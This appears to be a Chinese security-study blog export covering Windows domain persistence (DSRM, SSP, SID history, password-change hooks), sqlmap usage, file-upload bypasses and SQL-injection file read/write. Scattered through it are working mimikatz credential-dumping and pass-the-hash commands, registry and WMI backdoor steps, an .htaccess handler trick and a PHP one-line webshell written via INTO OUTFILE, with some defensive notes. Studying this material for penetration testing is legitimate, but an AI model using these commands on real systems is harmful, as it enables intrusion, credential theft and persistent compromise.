<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;枚举域中的用户组</span><br><span class="line">lg.exe &lt;domain name&gt;\.</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;枚举远程机器的本地组用户</span><br><span class="line">lg.exe \\dc2012</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获取远程用户中全部用户的SID</span><br><span class="line">lg.exe \\dc2012 -lu -sidsout</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获取指定组中所有成员的SID</span><br><span class="line">lg.exe \\dc2012\administrators -sidsout</span><br></pre></td></tr></table></figure>

<h2 id="7-3-防范跨域攻击"><a href="#7-3-防范跨域攻击" class="headerlink" title="7.3 防范跨域攻击"></a>7.3 防范跨域攻击</h2><h1 id="第八章-权限维持分析及防御"><a href="#第八章-权限维持分析及防御" class="headerlink" title="第八章 权限维持分析及防御"></a>第八章 权限维持分析及防御</h1><h2 id="8-1-操作系统后门分析与防范"><a href="#8-1-操作系统后门分析与防范" class="headerlink" title="8.1 操作系统后门分析与防范"></a>8.1 操作系统后门分析与防范</h2><h3 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h3><h3 id="注册表注入后门"><a href="#注册表注入后门" class="headerlink" title="注册表注入后门"></a>注册表注入后门</h3><p>这个在ATT&amp;CK中的Persistence一章中的Registry Run Keys / Startup Folder中有提到。命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run &#x2F;v RegRun &#x2F;t REG_SZ &#x2F;d &quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure>

<h3 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h3><h3 id="meterpreter后门"><a href="#meterpreter后门" class="headerlink" title="meterpreter后门"></a>meterpreter后门</h3><h3 id="Cymothoa后门"><a href="#Cymothoa后门" class="headerlink" title="Cymothoa后门"></a>Cymothoa后门</h3><p>下载地址：<a href="https://sourceforge.net/projects/cymothoa/" target="_blank" rel="noopener">https://sourceforge.net/projects/cymothoa/</a></p>
<p>安装可参照<a href="https://blog.csdn.net/qq_17204441/article/details/88834099" target="_blank" rel="noopener">https://blog.csdn.net/qq_17204441/article/details/88834099</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;cymothoa -s 0 -p &lt;process id&gt; -y &lt;port&gt;</span><br></pre></td></tr></table></figure>

<p>安装成功后使用nc等工具连接设置的端口即可。</p>
<h3 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h3><p>WMI后门的特征是无文件和无进程，将代码加密存储于WMI中，达到所谓的无文件，当设定的条件被满足时，系统将自动启动Powershell进程去执行后门程序，执行后进程将会消失。</p>
<p>Empire下有WMI相关的模块可以使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usemodule powershell&#x2F;persistence&#x2F;elevated&#x2F;wmi</span><br></pre></td></tr></table></figure>

<p>可以在目标主机中使用命令查看存在的后门：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer</span><br></pre></td></tr></table></figure>

<p>清理WMI后门的方法：删除自动运行列表中的恶意WMI条目，使用Get-WMIObject命令删除与WMI持久化相关的组件。</p>
<h2 id="8-2-WEB后门"><a href="#8-2-WEB后门" class="headerlink" title="8.2 WEB后门"></a>8.2 WEB后门</h2><h3 id="Nishang下的WEBShell"><a href="#Nishang下的WEBShell" class="headerlink" title="Nishang下的WEBShell"></a>Nishang下的WEBShell</h3><h3 id="Weevely后门"><a href="#Weevely后门" class="headerlink" title="Weevely后门"></a>Weevely后门</h3><h3 id="webacoo后门工具"><a href="#webacoo后门工具" class="headerlink" title="webacoo后门工具"></a>webacoo后门工具</h3><h2 id="8-3-域控制器权限持久化分析与防范"><a href="#8-3-域控制器权限持久化分析与防范" class="headerlink" title="8.3 域控制器权限持久化分析与防范"></a>8.3 域控制器权限持久化分析与防范</h2><h3 id="DSRM后门"><a href="#DSRM后门" class="headerlink" title="DSRM后门"></a>DSRM后门</h3><p>使用mimikatz查看krbtgt账户密码hash值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa &#x2F;patch &#x2F;name:krbtgt&quot; exit</span><br></pre></td></tr></table></figure>

<p><img src="8_1.png" alt=""></p>
<p>查看SAM文件中本地管理员的NTLM HASH值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\mimikatz.exe &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</span><br></pre></td></tr></table></figure>

<p><img src="8_2.png" alt=""></p>
<p>这里的4cb开头的hash就是DSRM hash，将DSRM hash和kebtgt的密码同步：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">set dsrm password</span><br><span class="line">SYNC FROM DOMAIN account krbtgt</span><br><span class="line">q</span><br></pre></td></tr></table></figure>

<p>再次查看会发现DSRM密码和krbtgt的密码相同，然后修改DSRM的登陆方式，这个注册表键值为2表示”在任何情况下都可以使用DSRM管理员账号登陆域控制器”：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure>

<p>使用mimikatz进行pth攻击：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::Debug&quot; &quot;sekurlsa::pth &#x2F;domain:DC &#x2F;user:administrator &#x2F;ntlm:XXXXXXXXXXX&quot;</span><br></pre></td></tr></table></figure>

<p>DSRM后门防御措施：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">检查hklm\system\currentcontrolset\control\lsa\dsrmadminlogonbehavior注册表键值的值，确认值为1</span><br><span class="line">定期修改DSRM的账号</span><br><span class="line">经常检查ID为4794的日志</span><br></pre></td></tr></table></figure>

<h3 id="SSP维持域控权限"><a href="#SSP维持域控权限" class="headerlink" title="SSP维持域控权限"></a>SSP维持域控权限</h3><p>方式一：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::debug&quot; &quot;misc::memssp&quot; exit</span><br></pre></td></tr></table></figure>

<p>注销之后执行命令查看明文密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe cat c:\windows\system32\mimilsa.log</span><br></pre></td></tr></table></figure>

<p><img src="8_3.png" alt=""></p>
<p>方式二：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe cp .\mimilib.dll C:\Windows\System32\</span><br><span class="line">Set-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;Security Packages&quot; -value &quot;mimilib.dll&quot;</span><br></pre></td></tr></table></figure>

<p>重启之后使用命令查看密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe cat c:\windows\system32\kiwissp.log</span><br></pre></td></tr></table></figure>

<p><img src="8_4.png" alt=""></p>
<p>防御措施：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看hklm\system\currentcontrolset\control\lsa\Security Packages注册表项是否含有可疑的DLL文件</span><br><span class="line">检查C:\windows\system32\目录下是否存在可疑的文件</span><br><span class="line">第三方工具检查</span><br></pre></td></tr></table></figure>

<h3 id="SID-History后门"><a href="#SID-History后门" class="headerlink" title="SID History后门"></a>SID History后门</h3><p>test为恶意账户，administrator</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-module ActiveDirectory</span><br><span class="line">Get-ADUser xiaom -Properties sidhistory</span><br><span class="line"></span><br><span class="line">.\mimikatz.exe &quot;privilege::Debug&quot; &quot;sid::patch&quot; &quot;sid::add &#x2F;sam:xiaom &#x2F;new:administrator&quot; exit</span><br></pre></td></tr></table></figure>

<p><img src="8_5.png" alt=""></p>
<p>此时使用xiaom账号可以访问域控</p>
<p><img src="8_6.png" alt=""></p>
<h3 id="Golden-Ticket-and-Silver-Ticket"><a href="#Golden-Ticket-and-Silver-Ticket" class="headerlink" title="Golden Ticket and Silver Ticket"></a>Golden Ticket and Silver Ticket</h3><h3 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h3><h3 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h3><p>这个方法要使用Invoke-ReflectivePEInjection.ps1将HookPasswordChange.dll注入内存，在目标系统中启动管理员权限的powershell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. .\Invoke-ReflectivePEInjection.ps1</span><br><span class="line">Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</span><br></pre></td></tr></table></figure>

<p>此时如果再修改用户密码则修改之后的密码会记录在C:\windows\Temp\password.txt文件中。</p>
<p>工具下载地址：<a href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1</a></p>
<p><a href="https://github.com/clymb3r/Misc-Windows-Hacking" target="_blank" rel="noopener">https://github.com/clymb3r/Misc-Windows-Hacking</a></p>
<p>参考地址：<a href="http://www.vuln.cn/6812" target="_blank" rel="noopener">http://www.vuln.cn/6812</a></p>
<h2 id="8-4-Nishang下的脚本后门分析与防范"><a href="#8-4-Nishang下的脚本后门分析与防范" class="headerlink" title="8.4 Nishang下的脚本后门分析与防范"></a>8.4 Nishang下的脚本后门分析与防范</h2><h3 id="HTTP-Backdoor"><a href="#HTTP-Backdoor" class="headerlink" title="HTTP-Backdoor"></a>HTTP-Backdoor</h3><h3 id="Add-ScrnSaveBackdoor"><a href="#Add-ScrnSaveBackdoor" class="headerlink" title="Add-ScrnSaveBackdoor"></a>Add-ScrnSaveBackdoor</h3><h3 id="Execute-OnTime"><a href="#Execute-OnTime" class="headerlink" title="Execute-OnTime"></a>Execute-OnTime</h3><h3 id="Invoke-ADSBackdoor"><a href="#Invoke-ADSBackdoor" class="headerlink" title="Invoke-ADSBackdoor"></a>Invoke-ADSBackdoor</h3>]]></content>
      <tags>
        <tag>书单</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2020/04/27/sqlmap/</url>
    <content><![CDATA[<p>SqImap是一种开源的渗透测试工具,可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器<a id="more"></a>。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。支持的数据库: MySQL , Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, sQLite,Firebird, Sybase and SAP MAXDB。</p>
<h2 id="sqlmap支持五种不同的注入模式"><a href="#sqlmap支持五种不同的注入模式" class="headerlink" title="sqlmap支持五种不同的注入模式:"></a>sqlmap支持五种不同的注入模式:</h2><pre><code>➢UNION query SQL, injection (可联合查询注入)
➢Error-based SQL injection (报错型注入)
➢Boolean-based blind SQL injection (布尔型注入)
➢Time-based blind SQL injection (基 于时间延迟注入)
➢Stacked queries SQL injection (可多语句查询注入)</code></pre><h2 id="食用方式"><a href="#食用方式" class="headerlink" title="食用方式"></a>食用方式</h2><h3 id="设置目标url"><a href="#设置目标url" class="headerlink" title="设置目标url"></a>设置目标url</h3><p>➢-u /–url<br>最基本格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;www.target.com&#x2F;index.php?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>
<p>➢-m<br>从文本中获取多个目标扫描,但是每一行一个url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -m &quot;urllist.txt&quot;</span><br></pre></td></tr></table></figure>
<p>➢-r<br>从文件中加载HTTP请求,这样的话就不需要在去设定Cookie,POST数据等等·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r &quot;&#x2F;tmp&#x2F;1.txt&quot;</span><br></pre></td></tr></table></figure>
<h3 id="设置回显等级"><a href="#设置回显等级" class="headerlink" title="设置回显等级"></a>设置回显等级</h3><p>参数: -V默认为1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;www.target.com&#x2F;index.php?id&#x3D;1&quot; -v</span><br></pre></td></tr></table></figure>

<pre><code>➢0、只显示python错误以及严重的信息
➢1、同时显示基本信息和警告信息( 默认等级)
➢2、同时显示debug信息
➢3、同时显示注入的payload
➢4、同时显示HTTP请求
➢5、同时显示HTTP响应头
➢6、同时显示HTTP响应页面</code></pre><h3 id="设置http数据包相关参数"><a href="#设置http数据包相关参数" class="headerlink" title="设置http数据包相关参数"></a>设置http数据包相关参数</h3><p><del>参数:</del> <code>--data</code><br>此参数是把数以POST方式提交, sqlmap会像检测GET参数一样检测POST过去的参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sq1map.py -u <span class="string">"http://www.target.com/vuln.php"</span> --data=<span class="string">"id=1"</span></span><br></pre></td></tr></table></figure>
<p><del>参数:</del> <code>--cookie</code><br>当web需要登录的时候,需要我们抓包获取cookie参数,然后复制出来,加到–cookie参数中。<br><del>参数:</del> <code>--user-agent</code><br>默认情况下sq|map的HTTP请求头中的User-Agent值是:<br><code>sqlmap/1.0-dev-xxxxxxx(http://sqlmap.org)这个时候可以手动指定伪造一个User-Agent</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.target.com&quot; --level 3 --user-agent&#x3D;&quot;aaaaaa&quot; --dbs</span><br></pre></td></tr></table></figure>
<p><del>参数:</del> <code>--random-agent</code><br><code>会从sqlmap/txt/user-agents.txt中随机产生User-Agent头</code><br><del>参数:</del> <code>--referer</code><br>sqlmap可以在请求中伪造HTTP中的referer.<br>➢<code>当--level参数设定&gt; =3时,会尝试进行referer注入</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.target.com&quot; --leve 3 --referer&#x3D;&quot;www.baidu.com&quot; -dbs</span><br></pre></td></tr></table></figure>
<p><del>参数:</del> <code>--delay</code><br>可以设定两个http请求间的延迟,设定为1的时候是1秒,默认是没有延迟的。<br><del>参数:</del> <code>--timeout</code><br>可以设定一个http请求超过对久判定为超时,默认是30秒。</p>
<h3 id="指定测试参数"><a href="#指定测试参数" class="headerlink" title="指定测试参数"></a>指定测试参数</h3><p><del>参数:</del> <code>--skip</code><br>但是使用–level的值很大但是有个别参数不行测试的时候可以使用–skip参数<br><code>例如: --skip=&quot;user-agent,referer&quot;</code><br><del>参数:</del> <code>-p</code><br>sqlmap默认会测试所有的GET和POST参数,当–level的值大于等于2的时候也会测试HTTP Cookie头的值,当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。<br><code>例如: -p &quot;id,user-angent”</code></p>
<h3 id="设定探测等级"><a href="#设定探测等级" class="headerlink" title="设定探测等级"></a>设定探测等级</h3><p><del>参数:</del> <code>--level</code><br>共有五个等级,默认为1,sqlmap使用的payload可以在xml/payloads.xmI中看到<br>自己也可以根据相应的格式添加自己的payload.</p>
<pre><code>level&gt;=2的时候就会测试HTTP Cookie
level&gt;=3的时候就会测试HTTP User-Agent/Referer头
level=5的时候会测试HTTP Host</code></pre><h3 id="设定探测风险等级"><a href="#设定探测风险等级" class="headerlink" title="设定探测风险等级"></a>设定探测风险等级</h3><p><del>参数:</del> <code>--risk</code><br>共有四个风险等级：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认是1会测试大部分的测试语句, </span><br><span class="line">2会增加基于时间的测试语句，</span><br><span class="line">3会增加OR语句的SQL注入测试。</span><br><span class="line">在有些时候,例如在UPDATE的语句中,注入一个OR的测试语句,可能导致更新的整个表,可能造成很大的风险。</span><br></pre></td></tr></table></figure>
<h3 id="一些常用参数"><a href="#一些常用参数" class="headerlink" title="一些常用参数"></a>一些常用参数</h3><pre><code>--users  列数据库管理用户,当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。
--current-user  在大多数据库中可以获取到管理数据的用户。
--is-dba  判断当前的用户是否为管理，是的话会返回True。
--privilges  当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将 会告诉你哪个是数据库的超级管理员。也可以用`-U`参数指定你想看那个用户的权限。
--proxy 指定一个代理服务器eg: `-proxy http://local:8080`
--prefix=PREFIX  注入payload字符串前缀
--suffix=SUFFIX  注入payload字符串后缀
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sglmap -u &quot;www.target.com&#x2F;index.php?id&#x3D;1&quot; -p id --prefix &quot;&#39;)&quot; --suffix &quot;AND (&#39;1&#39;&#x3D;&#39;1”</span><br></pre></td></tr></table></figure></code></pre><h3 id="列数据"><a href="#列数据" class="headerlink" title="列数据"></a>列数据</h3><pre><code>--dbs        //列出所有数据库名称
-- current-db         //列出当前数据库名称
-D ~~指定数据库名~~ --tables        //指定数据库的所有表名
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--tables -D database_name</span><br></pre></td></tr></table></figure>
-D ~~指定数据库名~~ -T ~~指定表名~~ --columns        //查询指定数据库的表中的列名
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--columns -T table_name -D database_name</span><br></pre></td></tr></table></figure>
-D ~~指定数据库名~~ -T ~~指定表名~~ -C 字段,字段,字段 --dump    //dump列中的数据结果
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--dump -C column_1,column_2 -T table_name -D database_name</span><br></pre></td></tr></table></figure></code></pre>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2020/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h2 id="文件上传成因"><a href="#文件上传成因" class="headerlink" title="文件上传成因"></a>文件上传成因</h2><a id="more"></a>
<p>如果不对被上传的文件进行限制或者限制被绕过,该功能便有可能会被利用上传可执行文件、脚本到服务器上,进而进一步导致服务器沦陷。很多原因导致文件上传漏洞,有以下几类:<br>1：服务器的错误的配置。<br>2：开源编辑器漏洞。<br>3：本地上传限制不严格被绕过。<br>4：服务端过滤不严格被绕过。<br><img src="1.png" alt="轻量级上传检测流程"></p>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>可能会造成网站被控制，服务器沦陷 甚至同一服务器的其他网站都沦陷</p>
<h2 id="一般上传检测框架"><a href="#一般上传检测框架" class="headerlink" title="一般上传检测框架"></a>一般上传检测框架</h2><img src="sc.png" style="zoom:50%;" />

<h2 id="客户端验证"><a href="#客户端验证" class="headerlink" title="客户端验证"></a>客户端验证</h2><h2 id="服务端检测绕过"><a href="#服务端检测绕过" class="headerlink" title="服务端检测绕过"></a>服务端检测绕过</h2><h3 id="服务端MIME验证"><a href="#服务端MIME验证" class="headerlink" title="服务端MIME验证"></a>服务端MIME验证</h3><p>MIME检测的是数据包content-type字段。常见的图片格式的MIME类型有三种类型:1(PNG图像：image/png),2(GIT图像：image/gif),3(JPG图像：image/jpeg)</p>
<h3 id="服务端拓展名验证"><a href="#服务端拓展名验证" class="headerlink" title="服务端拓展名验证"></a>服务端拓展名验证</h3><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><h5 id="可以尝试文件名大小写"><a href="#可以尝试文件名大小写" class="headerlink" title="可以尝试文件名大小写"></a>可以尝试文件名大小写</h5><h5 id="pHp-AsP-pY"><a href="#pHp-AsP-pY" class="headerlink" title="pHp AsP pY"></a><code>pHp</code> <code>AsP</code> <code>pY</code></h5><h5 id="特殊文件名"><a href="#特殊文件名" class="headerlink" title="特殊文件名"></a>特殊文件名</h5><p>在Windows’下有一个特性就是如果文件后缀以点<code>‘.’</code>或者空格<code>&#39; &#39;</code>结尾的后缀名时,系统在保存文件时会自动去除点和空格。但要注意Unix/Linux系统没有这个特性。</p>
<p><code>.php5</code> <code>.php3</code> 这种格式一般不会被解析执行</p>
<h5 id="htaccess文件攻击"><a href="#htaccess文件攻击" class="headerlink" title=".htaccess文件攻击"></a><code>.htaccess</code>文件攻击</h5><p><code>.htaccess</code>文件是Apache服务器中的一一个配置文件，它负责相关目录下的网页配置。通过<code>htaccess</code>文件,可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。如果服务器对文件名控制不够严格,通过<code>move_ uploaded_ file</code> 函数把自己写的.htaccess 文件覆盖掉服务器上的这样就可以解析定义名单了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.htaccess文件内容:</span><br><span class="line">&lt;FilesMatch &quot;haha&quot; &gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>



<p>通过<code>.htaccess</code>文件调用<code>php</code>解释器去解析一个文件名中只要包含<code>&quot;haha&quot;</code>这<br>个字符串的任意文件,无论你文件名是什么样子,只要包含<code>”haha&quot;</code>这个字符<br>串,都可以被以<code>php</code>的方式来解析。</p>
<h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><h5 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a><code>0x00</code>截断</h5><p>文件名后缀有一个<code>%00</code>字节,可以截断某些函数对文件名的判断。在许多语言函数中,处理字符串的函数中<code>0x00</code>被认为是终止符。例如:网站上传函数处理<code>xx.asp%00.jpg</code>时，首先后缀名是合法的<code>jpg</code>格式，可以上传,在保存文件时,遇到<code>%00</code>字符丢弃后面的<code>jpg</code> ,文件后缀最终保存的后缀名为<code>xxx.asp</code></p>
<p><code>url</code>编码组成：百分号+字符的<code>ascii</code>编码的十六进制,所以空格<code>url</code>编码为%20。空格的十六进制为<code>0x20</code> 上传文件的时候在<code>burp-hex</code>编码里找到上传文件结尾加空格的20改成00就可以构成00截断。但00截断只在asp程序上比较有效。</p>
<h4 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h4><h5 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h5><h5 id="iis"><a href="#iis" class="headerlink" title="iis"></a>iis</h5><h5 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h5><h4 id="配合文件包含"><a href="#配合文件包含" class="headerlink" title="配合文件包含"></a>配合文件包含</h4><h3 id="文件内容检测绕过"><a href="#文件内容检测绕过" class="headerlink" title="文件内容检测绕过"></a>文件内容检测绕过</h3><h2 id="文件幻术检测绕过"><a href="#文件幻术检测绕过" class="headerlink" title="文件幻术检测绕过"></a>文件幻术检测绕过</h2><p><img src="hs.png" alt=""></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>xss基础</title>
    <url>/2020/04/25/xss/</url>
    <content><![CDATA[<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>读/写文件</title>
    <url>/2020/04/14/%E8%AF%BB-%E5%86%99%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>mysql的两个函数：<code>LOAD_FILE( )</code>，<code>INTO OUTFILE( )</code><a id="more"></a></p>
<h2 id="LOAD-FILE"><a href="#LOAD-FILE" class="headerlink" title="LOAD_FILE( )"></a>LOAD_FILE( )</h2><p>作用:读取文件并返回文件内容。<br>前提条件:<br>➢知道文件绝对路径<br>➢当前连接数据库用户必须有FILE权限<br>➢可以使用UNION查询</p>
<h3 id="查看secure-file-priv参数的值："><a href="#查看secure-file-priv参数的值：" class="headerlink" title="查看secure_file_priv参数的值："></a>查看<code>secure_file_priv</code>参数的值：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global variables like &#39;secure_file_priv&#39;;</span><br></pre></td></tr></table></figure>
<p><del>解决secure_file_priv的问题:</del></p>
<pre><code>windows： 修改my.ini 在[mysqld]内加入secure_file_priv =
linux  ： 修改my.cnf 在[mysqld]内加入secure_file_priv =
然后重启mysql，再查询secure_file_priv</code></pre><p><code>secure-file-priv</code>参数是用来限制<code>LOAD DATA</code>,<code>SELECT ... OUTFILE</code>,<code>and LOAD_FILE()</code>传到哪个指定目录的。<code>secure_file_priv</code>的值为null ，表示限制mysqld 不允许导入/导出。当<code>secure_file_priv</code>的值为<code>/tmp/</code> ，表示限制mysqld的导入/导出只能发生在/tmp/目录下。当<code>secure_file_priv</code>的值没有具体值时，表示不对mysqld 的导入|导出做限制。</p>
<h3 id="关于读文件的时候路径编码问题"><a href="#关于读文件的时候路径编码问题" class="headerlink" title="关于读文件的时候路径编码问题"></a>关于读文件的时候路径编码问题</h3><pre><code>这都成功了，编码后还不见结果就还搞不清楚了···</code></pre><p><img src="11.bmp" alt=""><br><img src="111.png" alt=""></p>
<pre><code>写了路径能看到结果，编码路径就不行，整句编码了还能显示查询语句的，</code></pre><p><img src="00.bmp" alt=""><br><img src="0.png" alt=""><br><img src="al.png" alt=""></p>
<h2 id="INTO-OUTFILE"><a href="#INTO-OUTFILE" class="headerlink" title="INTO OUTFILE"></a>INTO OUTFILE</h2><p>作用:此函数的作用是将查询结果写入到文件中。<br>前提条件:<br>➢写入的文件路径必须为绝对路径。<br>➢当前连接数据库用户必须有FILE权限。<br>➢没有对单引号进行转义或者过滤。<br>➢可以使用union查询<br>php的一句话木马：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,&#39;&lt;?php @eval($_post[123])&gt;&#39;,3 into outfile &#39;D:&#x2F;521&#x2F;c.php&#39;;</span><br></pre></td></tr></table></figure>
<p><img src="in.png" alt=""></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>sql-labs</title>
    <url>/2020/04/13/sql-labs/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">您需要提供访问密码才能查看内容。</label>
    <div class="bottom-line"></div>
  </div>

  <script id="hbeData" type="hbeData" data-hmacdigest="755a68744d7c5c96859974b64cccbc34a7c8495100600be31c83744c5f7e9a2f"></script>
</div>



	



<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2020/04/12/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><h3 id="sql注入流程"><a href="#sql注入流程" class="headerlink" title="sql注入流程"></a>sql注入流程</h3><p>1：判断注入点，在可能存在SQL注入变量的后边添加以下payload:<a id="more"></a><br>➢<code>and 1=1</code> / <code>and 1=2</code>回显页面不同(整形判断)<br>➢单引号或双引号判断显示数据库错误信息或者页面回显不同(整形，字符串类型判断)<br>➢<code>\</code> (转义符)<br>➢<code>-1</code>/<code>+1</code>回显下一个或上一个页面(整型判断)<br>注:加号<code>&#39;+&#39;</code>在URL中有特殊含义，因此在需要对其进行URL编码为<code>%2b</code>。<br>2：判断是整型注入还是字符型注入<br>数字型与字符型的最大区别在于:数字类型不需要引号闭合,而字符类型需要使用引号闭合。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from table where id &#x3D; 1      #数字型</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from table where username &#x3D; &#39;admin&#39;	  #字符型</span><br></pre></td></tr></table></figure>
<p>3、根据不同的分类进行注入<br>根据SQL注入语法分类:<br>➢UNION query SQL injection (可联合查询注入)<br>➢Error-based SQL injection (报错型注入)<br>➢Boolean-based blind SQL injection (基于布尔型注入)<br>➢Time-based blind SQL injection (基于时间延迟注入)<br>➢Stacked queries SQL injection(可多语句查询注入)</p>
<h3 id="UNION使用规则"><a href="#UNION使用规则" class="headerlink" title="UNION使用规则"></a>UNION使用规则</h3><p>UNION的作用是将两个或多个SELECT语句查询结果合并起来。<br>➢UNION必须由两条或两条以上的SELECT语句组成,语句之间用关键字UNION分隔。<br>➢UNION中的每个查询的列数必须相同。<br>➢UNION会从查询结果集中自动去除了重复行。</p>
<h3 id="联合查询注入前提"><a href="#联合查询注入前提" class="headerlink" title="联合查询注入前提"></a>联合查询注入前提</h3><p>前提条件:页面上有显示位，在一个网站的正常页面,服务端执行SQL语句查询数据库中的数据,客户端将数据展示在页面中,这个展示数据的位置就叫显示位。</p>
